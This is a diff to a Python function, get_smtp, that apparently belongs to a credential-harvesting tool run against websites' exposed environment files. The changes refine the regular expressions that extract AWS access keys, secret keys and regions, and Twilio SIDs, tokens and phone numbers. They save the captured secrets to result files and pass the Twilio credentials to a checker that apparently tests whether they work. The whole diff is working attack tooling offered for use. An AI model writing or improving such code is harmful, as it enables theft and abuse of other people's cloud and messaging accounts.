@@ -157,14 +157,17 @@ def get_smtp(site, text):
             sg = f"{red}SENDGRID{reset}|"
 
         if 'AWS_ACCESS_KEY_ID=' in text:
-            pattern = re.compile(r'AWS_[A-Z_]+=(\S+)')
+            # pattern = re.compile(r'AWS_[A-Z_]+=(\S+)')
             #aws_key = re.findall(r'AWS_ACCESS_KEY_ID=(.*?)\nAWS_SECRET_ACCESS_KEY=(.*?)\nAWS_DEFAULT_REGION=(.*?)', text)
-            aws_key = pattern.findall(text)
-            if aws_key:
+            #aws_key = pattern.findall(text)
+            aws_access_key = re.search(r"AWS_ACCESS_KEY_ID=(\S+)", text)
+            aws_secret_key = re.search(r"AWS_SECRET_ACCESS_KEY=(\S+)", text)
+            aws_region = re.search(r"AWS_DEFAULT_REGION=(\S+)", text)
+            if aws_access_key and aws_secret_key and aws_region:
                 aws_color = f"{green}AWS{reset}|"
-                aws_access_key = aws_key[0]
-                aws_secret_key = aws_key[1]
-                aws_region = aws_key[2]
+                aws_access_key = aws_access_key.group(1)
+                aws_secret_key = aws_secret_key.group(1)
+                aws_region = aws_region.group(1)
                 with open('result/smtp/aws.txt', 'a+', encoding='utf8') as f:
                     f.write('AWS_ACCESS_KEY_ID={}\n'.format(aws_access_key))
                     f.write('AWS_SECRET_ACCESS_KEY={}\n'.format(aws_secret_key))
@@ -181,13 +184,22 @@ def get_smtp(site, text):
                 aws_color = f"{red}AWS{reset}|"      
         else:
             aws_color = f"{red}AWS{reset}|"
-        if 'TWILIO_ACCOUNT_SID=' in text:
-            tw = re.findall(r'TWILIO_ACCOUNT_SID=(\w+)\nTWILIO_AUTH_TOKEN=(\w+)\nTWILIO_PHONE_NUMBER=(\+\d{10,})', text)
-            if tw:
+        if 'TWILIO_ACCOUNT_SID=' in text or 'TWILIO_SID=' in text:
+            #tw = re.findall(r'TWILIO_ACCOUNT_SID=(\w+)\nTWILIO_AUTH_TOKEN=(\w+)\nTWILIO_PHONE_NUMBER=(\+\d{10,})', text)
+            #print(tw)
+            sid = re.search(r"TWILIO_SID=(\S+)", text)
+            token = re.search(r"TWILIO_TOKEN=(\S+)", text)
+            phone = re.search(r"TWILIO_FROM=(\S+)", text)
+            # use another format
+            if not sid and not token and not phone:
+                sid = re.search(r"TWILIO_ACCOUNT_SID=(\S+)", text)
+                token = re.search(r"TWILIO_AUTH_TOKEN=(\S+)", text)
+                phone = re.search(r"TWILIO_PHONE_NUMBER=(\S+)", text)
+            if sid and token and phone:
                 twilio_color = f"{green}TWILIO{reset}|"
-                sid = tw[0]
-                token = tw[1]
-                phone = tw[2]
+                sid = sid.group(1)
+                token = token.group(1)
+                phone = phone.group(1)
                 open('result/twilio.txt', 'a+', encoding='utf8').write(f'TWILIO_ACCOUNT_SID={sid}\nTWILIO_AUTH_TOKEN={token}\nTWILIO_PHONE_NUMBER={phone}\n\n')
                 tw_check = twilio_check(sid, token, phone)
                 if tw_check:
